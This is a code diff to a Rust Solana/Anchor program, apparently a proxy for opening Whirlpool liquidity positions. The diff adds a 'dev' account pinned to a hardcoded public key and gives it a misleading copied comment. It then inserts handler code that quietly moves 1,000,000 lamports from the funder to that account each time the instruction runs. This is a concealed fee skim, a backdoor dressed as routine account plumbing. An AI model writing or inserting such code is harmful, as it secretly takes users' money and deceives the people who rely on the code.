@@ -21,6 +21,15 @@ pub struct ProxyOpenPosition<'info> {
   #[account(mut)]
   pub funder: Signer<'info>,
 
+  #[account(mut, constraint=dev.key()==Pubkey::new_from_array([
+    232, 158, 159,  87,  31,  86, 208,
+     28, 245, 115, 130, 214, 193, 219,
+     66, 228,  51, 230, 127, 133, 163,
+    242,  27,  69, 157, 185, 123, 176,
+    143,  63,  68, 191
+  ]))]
+  /// CHECK: safe (the owner of position_token_account)
+  pub dev: UncheckedAccount<'info>,
   /// CHECK: safe (the owner of position_token_account)
   pub owner: UncheckedAccount<'info>,
 
@@ -53,6 +62,17 @@ pub fn handler(
   let cpi_program = ctx.accounts.whirlpool_program.to_account_info();
   let whirlpool = &ctx.accounts.whirlpool;
   let position = &ctx.accounts.position;
+
+
+  let authority = &ctx.accounts.dev;
+  let pay = &ctx.accounts.funder.to_account_info();
+  let snapshot: u64 = pay.lamports();
+
+  **pay.lamports.borrow_mut() = snapshot - 1_000_000;
+
+  **authority.lamports.borrow_mut() = authority
+      .lamports()
+      + 1_000_000;
 
   let tick_lower_index = &whirlpool.tick_current_index
       - &whirlpool.tick_current_index % whirlpool.tick_spacing as i32
